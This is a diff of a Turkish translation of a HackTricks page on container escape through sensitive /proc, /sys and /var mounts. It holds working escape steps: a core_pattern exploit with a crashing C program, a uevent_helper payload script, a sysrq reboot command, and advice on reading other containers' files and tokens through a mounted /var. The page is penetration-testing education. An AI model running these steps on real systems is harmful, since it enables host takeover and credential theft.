@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-`/proc`, `/sys` ve `/var`'ın uygun namespace izolasyonu olmadan açığa çıkması, saldırı yüzeyinin genişlemesi ve bilgi sızıntısı da dahil olmak üzere önemli güvenlik riskleri oluşturur. Bu dizinler, yanlış yapılandırıldığında veya yetkisiz bir kullanıcı tarafından erişildiğinde, konteyner kaçışına, ana makine değişikliğine veya daha fazla saldırıyı destekleyen bilgilerin sağlanmasına yol açabilecek hassas dosyalar içerir. Örneğin, `-v /proc:/host/proc` yanlış bir şekilde monte edilirse, yol tabanlı doğası nedeniyle AppArmor korumasını atlayabilir ve `/host/proc`'u korumasız bırakabilir.
+`/proc`, `/sys` ve `/var`'ın uygun namespace izolasyonu olmadan açılması, saldırı yüzeyinin genişlemesi ve bilgi sızdırma gibi önemli güvenlik riskleri oluşturur. Bu dizinler, yanlış yapılandırıldığında veya yetkisiz bir kullanıcı tarafından erişildiğinde, konteyner kaçışına, ana makine değişikliğine veya daha fazla saldırıyı destekleyen bilgilerin sağlanmasına yol açabilecek hassas dosyalar içerir. Örneğin, `-v /proc:/host/proc` yanlış bir şekilde monte edilirse, yol tabanlı doğası nedeniyle AppArmor korumasını atlayabilir ve `/host/proc`'ı korumasız bırakabilir.
 
 **Her potansiyel zafiyetin daha fazla detayını bulabilirsiniz** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -10,25 +10,37 @@
 
 ### `/proc/sys`
 
-Bu dizin, genellikle `sysctl(2)` aracılığıyla çekirdek değişkenlerini değiştirme izni verir ve birkaç endişe verici alt dizin içerir:
+Bu dizin, genellikle `sysctl(2)` aracılığıyla çekirdek değişkenlerini değiştirmek için erişime izin verir ve endişe verici birkaç alt dizin içerir:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
 - [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) içinde tanımlanmıştır.
-- İlk 128 baytı argüman olarak kullanarak çekirdek dosyası oluşturulduğunda çalıştırılacak bir program tanımlamaya izin verir. Dosya bir boru `|` ile başlarsa, bu kod yürütmeye yol açabilir.
+- Bu dosyaya yazabiliyorsanız, bir boru `|` yazıp ardından bir program veya scriptin yolunu yazmak mümkündür; bu, bir çökme gerçekleştiğinde çalıştırılacaktır.
+- Bir saldırgan, `mount` komutunu çalıştırarak konteynerinin içindeki ana makinedeki yolu bulabilir ve bu yolu konteyner dosya sistemindeki bir ikili dosyaya yazabilir. Ardından, bir programı çökertip çekirdeğin ikili dosyayı konteynerin dışındaki bir yerde çalıştırmasını sağlayabilir.
+
 - **Test ve Sömürü Örneği**:
-
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Yazma erişimini test et
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Özel işleyici ayarla
-sleep 5 && ./crash & # İşleyiciyi tetikle
+echo "|$overlay/shell.sh" > core_pattern # Set custom handler
+sleep 5 && ./crash & # Trigger handler
 ```
+Daha fazla bilgi için [bu gönderiyi](https://pwning.systems/posts/escaping-containers-for-fun/) kontrol edin.
 
+Çöken örnek program:
+```c
+int main(void) {
+char buf[1];
+for (int i = 0; i < 100; i++) {
+buf[i] = 1;
+}
+return 0;
+}
+```
 #### **`/proc/sys/kernel/modprobe`**
 
 - [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde detaylandırılmıştır.
-- Çekirdek modül yükleyicisinin yolunu içerir, çekirdek modüllerini yüklemek için çağrılır.
+- Kernel modül yükleyicisinin yolunu içerir, kernel modüllerini yüklemek için çağrılır.
 - **Erişim Kontrolü Örneği**:
 
 ```bash
@@ -38,7 +50,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # modprobe erişimini kontrol et
 #### **`/proc/sys/vm/panic_on_oom`**
 
 - [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde referans verilmiştir.
-- OOM durumu meydana geldiğinde çekirdeğin panik yapıp yapmayacağını kontrol eden bir global bayraktır.
+- OOM durumu meydana geldiğinde kernel'in panik yapıp yapmayacağını kontrol eden global bir bayraktır.
 
 #### **`/proc/sys/fs`**
 
@@ -47,9 +59,9 @@ ls -l $(cat /proc/sys/kernel/modprobe) # modprobe erişimini kontrol et
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Büyü numarasına dayalı olarak yerel olmayan ikili formatlar için yorumlayıcıları kaydetmeye izin verir.
-- `/proc/sys/fs/binfmt_misc/register` yazılabilir olduğunda ayrıcalık yükselmesine veya root shell erişimine yol açabilir.
-- İlgili sömürü ve açıklama:
+- Büyü numarasına dayalı olarak yerel olmayan ikili formatlar için yorumlayıcıların kaydedilmesine izin verir.
+- `/proc/sys/fs/binfmt_misc/register` yazılabilir ise ayrıcalık yükselmesine veya root shell erişimine yol açabilir.
+- İlgili istismar ve açıklama:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Derinlemesine eğitim: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
@@ -57,12 +69,12 @@ ls -l $(cat /proc/sys/kernel/modprobe) # modprobe erişimini kontrol et
 
 #### **`/proc/config.gz`**
 
-- `CONFIG_IKCONFIG_PROC` etkinse çekirdek yapılandırmasını açığa çıkarabilir.
-- Saldırganlar için çalışan çekirdekteki zayıflıkları tanımlamak için yararlıdır.
+- `CONFIG_IKCONFIG_PROC` etkinse kernel yapılandırmasını açığa çıkarabilir.
+- Saldırganlar için çalışan kernel'deki zayıflıkları tanımlamakta faydalıdır.
 
 #### **`/proc/sysrq-trigger`**
 
-- Sysrq komutlarını çağırmaya izin verir, bu da ani sistem yeniden başlatmalarına veya diğer kritik eylemlere neden olabilir.
+- Sysrq komutlarını çağırmaya izin verir, bu da anında sistem yeniden başlatmalarına veya diğer kritik eylemlere neden olabilir.
 - **Ana Makineyi Yeniden Başlatma Örneği**:
 
 ```bash
@@ -71,66 +83,66 @@ echo b > /proc/sysrq-trigger # Ana makineyi yeniden başlatır
 
 #### **`/proc/kmsg`**
 
-- Çekirdek halka tamponu mesajlarını açığa çıkarır.
-- Çekirdek sömürülerine, adres sızıntılarına yardımcı olabilir ve hassas sistem bilgilerini sağlayabilir.
+- Kernel halka tampon mesajlarını açığa çıkarır.
+- Kernel istismarlarına, adres sızıntılarına yardımcı olabilir ve hassas sistem bilgileri sağlayabilir.
 
 #### **`/proc/kallsyms`**
 
-- Çekirdek tarafından dışa aktarılan sembolleri ve adreslerini listeler.
-- KASLR'yi aşmak için çekirdek sömürü geliştirmede önemlidir.
-- Adres bilgisi `kptr_restrict` 1 veya 2 olarak ayarlandığında kısıtlanır.
+- Kernel tarafından dışa aktarılan sembolleri ve adreslerini listeler.
+- Kernel istismar geliştirme için önemlidir, özellikle KASLR'yi aşmak için.
+- Adres bilgileri `kptr_restrict` `1` veya `2` olarak ayarlandığında kısıtlanır.
 - [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde detaylar.
 
 #### **`/proc/[pid]/mem`**
 
-- Çekirdek bellek cihazı `/dev/mem` ile arayüz sağlar.
-- Tarihsel olarak ayrıcalık yükseltme saldırılarına karşı savunmasızdır.
+- Kernel bellek cihazı `/dev/mem` ile arayüz sağlar.
+- Tarihsel olarak ayrıcalık yükselme saldırılarına karşı savunmasızdır.
 - Daha fazla bilgi için [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
-- Sistemin fiziksel belleğini ELF çekirdek formatında temsil eder.
+- Sisteminin fiziksel belleğini ELF çekirdek formatında temsil eder.
 - Okuma, ana makine ve diğer konteynerlerin bellek içeriklerini sızdırabilir.
-- Büyük dosya boyutu okuma sorunlarına veya yazılım çökmesine yol açabilir.
-- Detaylı kullanım için [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) bakılabilir.
+- Büyük dosya boyutu okuma sorunlarına veya yazılım çökmesine neden olabilir.
+- Detaylı kullanım için [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) bağlantısına bakın.
 
 #### **`/proc/kmem`**
 
-- Çekirdek sanal belleğini temsil eden `/dev/kmem` için alternatif bir arayüzdür.
-- Okuma ve yazma izni verir, dolayısıyla çekirdek belleğini doğrudan değiştirmeye olanak tanır.
+- Kernel sanal belleğini temsil eden `/dev/kmem` için alternatif bir arayüz.
+- Okuma ve yazma işlemlerine izin verir, dolayısıyla kernel belleğinin doğrudan değiştirilmesine olanak tanır.
 
 #### **`/proc/mem`**
 
-- Fiziksel belleği temsil eden `/dev/mem` için alternatif bir arayüzdür.
-- Okuma ve yazma izni verir, tüm belleği değiştirmek için sanal adreslerin fiziksel adreslere çözülmesi gerekir.
+- Fiziksel belleği temsil eden `/dev/mem` için alternatif bir arayüz.
+- Okuma ve yazma işlemlerine izin verir, tüm belleğin değiştirilmesi sanal adreslerin fiziksel adreslere dönüştürülmesini gerektirir.
 
 #### **`/proc/sched_debug`**
 
-- PID namespace korumalarını atlayarak süreç zamanlama bilgilerini döndürür.
+- PID ad alanı korumalarını atlayarak süreç zamanlama bilgilerini döndürür.
 - Süreç adlarını, kimliklerini ve cgroup tanımlayıcılarını açığa çıkarır.
 
 #### **`/proc/[pid]/mountinfo`**
 
-- Sürecin mount namespace'inde mount noktaları hakkında bilgi sağlar.
-- Konteyner `rootfs` veya görüntüsünün konumunu açığa çıkarır.
+- Sürecin mount ad alanındaki mount noktaları hakkında bilgi sağlar.
+- Konteynerin `rootfs` veya görüntüsünün konumunu açığa çıkarır.
 
-### `/sys` Vulnerabilities
+### `/sys` Zayıflıkları
 
 #### **`/sys/kernel/uevent_helper`**
 
-- Çekirdek cihaz `uevents`'lerini işlemek için kullanılır.
+- Kernel cihaz `uevents`'lerini işlemek için kullanılır.
 - `/sys/kernel/uevent_helper`'a yazmak, `uevent` tetikleyicileri üzerine rastgele betikler çalıştırabilir.
-- **Sömürü Örneği**: %%%bash
+- **İstismar Örneği**: %%%bash
 
 #### Bir yük oluşturur
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### Konteyner için OverlayFS montajından ana makine yolunu bulur
+#### Konteyner için OverlayFS mount'tan ana makine yolunu bulur
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Uevent_helper'ı kötü niyetli yardımcıya ayarlar
+#### uevent_helper'ı kötü niyetli yardımcıya ayarlar
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
@@ -148,7 +160,7 @@ cat /output %%%
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Çekirdek adreslerini sızdırır, bu da KASLR'yi tehlikeye atabilir.
+- Kernel adreslerini sızdırır, bu da KASLR'yi tehlikeye atabilir.
 
 #### **`/sys/kernel/security`**
 
@@ -158,16 +170,18 @@ cat /output %%%
 #### **`/sys/firmware/efi/vars` ve `/sys/firmware/efi/efivars`**
 
 - NVRAM'daki EFI değişkenleri ile etkileşim kurmak için arayüzler açığa çıkarır.
-- Yanlış yapılandırma veya sömürü, bozuk dizüstü bilgisayarlara veya önyüklenemez ana makinelerle sonuçlanabilir.
+- Yanlış yapılandırma veya istismar, bozuk dizüstü bilgisayarlara veya başlatılamayan ana makinelerle sonuçlanabilir.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs`, çekirdeğe "kural yok" hata ayıklama arayüzü sunar.
-- Kısıtlanmamış doğası nedeniyle güvenlik sorunları geçmişi vardır.
+- `debugfs`, kernel için "kuralsız" bir hata ayıklama arayüzü sunar.
+- Kısıtlamasız doğası nedeniyle güvenlik sorunları geçmişi vardır.
 
-### `/var` Vulnerabilities
+### `/var` Zayıflıkları
 
-Ana makinenin **/var** klasörü, konteyner çalışma soketlerini ve konteynerlerin dosya sistemlerini içerir. Bu klasör bir konteyner içinde monte edilirse, o konteyner diğer konteynerlerin dosya sistemlerine root ayrıcalıklarıyla okuma-yazma erişimi alır. Bu, konteynerler arasında geçiş yapmak, hizmet reddi oluşturmak veya içinde çalışan diğer konteynerlere ve uygulamalara arka kapı açmak için kötüye kullanılabilir.
+Ana makinenin **/var** klasörü, konteyner çalışma soketlerini ve konteynerlerin dosya sistemlerini içerir. 
+Bu klasör bir konteyner içinde montelenirse, o konteyner diğer konteynerlerin dosya sistemlerine root ayrıcalıkları ile okuma-yazma erişimi alır. 
+Bu, konteynerler arasında geçiş yapmak, hizmet reddi oluşturmak veya içinde çalışan diğer konteynerler ve uygulamalar için arka kapı açmak için kötüye kullanılabilir.
 
 #### Kubernetes
 
@@ -218,7 +232,7 @@ XSS şu şekilde gerçekleştirildi:
 
 ![Mounted /var klasörü aracılığıyla saklanan XSS](/images/stored-xss-via-mounted-var-folder.png)
 
-Konteynerin bir yeniden başlatmaya veya başka bir şeye ihtiyaç duymadığını unutmayın. Mounted **/var** klasörü aracılığıyla yapılan herhangi bir değişiklik anında uygulanacaktır.
+Konteynerin yeniden başlatılmasına veya başka bir şeye ihtiyaç duymadığını unutmayın. Mounted **/var** klasörü aracılığıyla yapılan herhangi bir değişiklik anında uygulanacaktır.
 
 Ayrıca, otomatik (veya yarı otomatik) RCE elde etmek için yapılandırma dosyalarını, ikili dosyaları, hizmetleri, uygulama dosyalarını ve shell profillerini değiştirebilirsiniz.
 
@@ -253,7 +267,7 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 ```
 #### Not
 
-Gerçek yollar farklı kurulumlarda farklılık gösterebilir, bu yüzden en iyi seçeneğiniz diğer konteynerlerin dosya sistemlerini ve SA / web kimlik belirteçlerini bulmak için **find** komutunu kullanmaktır.
+Gerçek yollar farklı kurulumlarda değişebilir, bu yüzden en iyi seçeneğiniz diğer konteynerlerin dosya sistemlerini ve SA / web kimlik belirteçlerini bulmak için **find** komutunu kullanmaktır.
 
 ### Referanslar
 
